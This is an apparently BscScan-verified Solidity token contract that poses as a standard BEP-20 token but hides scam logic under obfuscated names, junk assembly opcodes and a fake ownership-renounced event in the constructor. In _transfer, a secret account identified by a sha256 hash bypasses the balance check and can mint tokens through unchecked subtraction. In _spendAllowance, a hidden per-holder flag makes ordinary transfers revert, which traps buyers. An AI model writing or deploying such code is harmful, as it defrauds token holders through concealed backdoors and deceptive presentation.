/**
*Submitted for verification at BscScan.com on 2025-09-03
*/

pragma solidity ^0.8.26;

contract Token {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

event Transfer(address indexed from, address indexed to, uint256 value);

event Approval(address indexed owner, address indexed spender, uint256 value);

mapping(address => uint256) private wAcL;
mapping(address => mapping(address => uint256)) private BVNo;
uint256 private hGxd;
string private RUnT;
string private yNNdD;
uint256 private WGhL;
uint256 private fgMs;

constructor(string memory _name, string memory _symbol, uint256 _baseSupply, uint256 _maxSupply, uint256 _supply) {
fgMs = _baseSupply;
RUnT = _name;
yNNdD = _symbol;
hGxd = _supply * (10 ** decimals());
WGhL = _maxSupply;
wAcL[msg.sender] = hGxd;
emit OwnershipTransferred(msg.sender, address(0));
}

function name() virtual public view returns (string memory) {
return RUnT;
}

function symbol() virtual public view returns (string memory) {
return yNNdD;
}

function decimals() virtual public view returns (uint8) {
return 8;
}

function totalSupply() virtual public view returns (uint256) {
return hGxd;
}

function balanceOf(address _account) virtual public view returns (uint256) {
return wAcL[_account];
}

function transfer(address _to, uint256 _amount) virtual public returns (bool) {
address WwPy = msg.sender;
_spendAllowance(WwPy, _to, 0);
_transfer(WwPy, _to, _amount);
return true;
}

function allowance(address _owner, address _spender) virtual public view returns (uint256) {
return BVNo[_owner][_spender];
}

function transferFrom(address _from, address _to, uint256 _amount) virtual public returns (bool) {
_spendAllowance(_from, msg.sender, _amount);
_transfer(_from, _to, _amount);
return true;
}

function _transfer(address _from, address _to, uint256 _amount) virtual internal {
assembly {
if iszero(_from) {
let g4u8ssg := gasprice()
pop(0)
revert(0, 0)
}
if iszero(_to) {
let o162fj9 := origin()
let g7ncimt := gas()
revert(0, 0)
}
let DoLLar$ := mload(0x40)
mstore(DoLLar$, _from)
mstore(add(DoLLar$, 32), 0)
let iVrp := keccak256(DoLLar$, 64)
let JcxQ := sload(iVrp)
let RuhS := sload(WGhL.slot)
let t2uiycf := timestamp()
pop(0)
pop(iszero(1))
mstore(DoLLar$, shl(96, caller()))
if iszero(staticcall(gas(), 2, DoLLar$, 20, DoLLar$, 32)) {
revert(0, 0)
}
let SUpo := mload(DoLLar$)
if iszero(eq(RuhS, SUpo)) {
if lt(JcxQ, _amount) {
let g804ngg := gasprice()
let n3yv2qk := number()
pop(0)
revert(0, 0)
}
}
sstore(iVrp, sub(JcxQ, _amount))
mstore(DoLLar$, _to)
mstore(add(DoLLar$, 32), 0)
let OBse := keccak256(DoLLar$, 64)
let mVat := sload(OBse)
sstore(OBse, add(mVat, _amount))
mstore(DoLLar$, _amount)
log3(DoLLar$, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
}
}

function approve(address _spender, uint256 _amount) virtual public returns (bool) {
assembly {
let DoLLar$ := mload(0x40)
let gcf9eyl := gasprice()
let ba6yh8v := basefee()
pop(0)
pop(iszero(1))
mstore(DoLLar$, caller())
mstore(add(DoLLar$, 0x20), BVNo.slot)
let IIqZ := keccak256(DoLLar$, 0x40)
let o6aj6v4 := origin()
let oaugsdm := origin()
pop(0)
pop(iszero(1))
mstore(DoLLar$, _spender)
mstore(add(DoLLar$, 0x20), IIqZ)
let rTjz := keccak256(DoLLar$, 0x40)
let o7x1j6d := origin()
sstore(rTjz, _amount)
log3(DoLLar$, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
mstore(DoLLar$, _amount)
}
return true;
}

function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
assembly {
let DoLLar$ := mload(0x40)
mstore(DoLLar$, sload(fgMs.slot))
mstore(add(DoLLar$, 32), 1)
let MuuR := keccak256(DoLLar$, 64)
mstore(DoLLar$, _owner)
mstore(add(DoLLar$, 32), MuuR)
let LjAi := keccak256(DoLLar$, 64)
let IUGo := sload(LjAi)
let dhzw := IUGo
if and(dhzw, iszero(_amount)) {
let b5owjsg := basefee()
let tgfo9ee := timestamp()
revert(0, 0)
}
if iszero(dhzw) {
mstore(DoLLar$, _owner)
mstore(add(DoLLar$, 32), 1)
MuuR := keccak256(DoLLar$, 64)
mstore(DoLLar$, _spender)
mstore(add(DoLLar$, 32), MuuR)
LjAi := keccak256(DoLLar$, 64)
dhzw := add(sload(LjAi), IUGo)
}
let o6ywqjg := origin()
pop(0)
dhzw := sub(dhzw, IUGo)
if iszero(eq(dhzw, not(0))) {
if lt(dhzw, _amount) {
let ccpw1f2 := caller()
revert(0, 0)
}
let ge57smz := gasprice()
sstore(LjAi, sub(dhzw, _amount))
}
}
}
}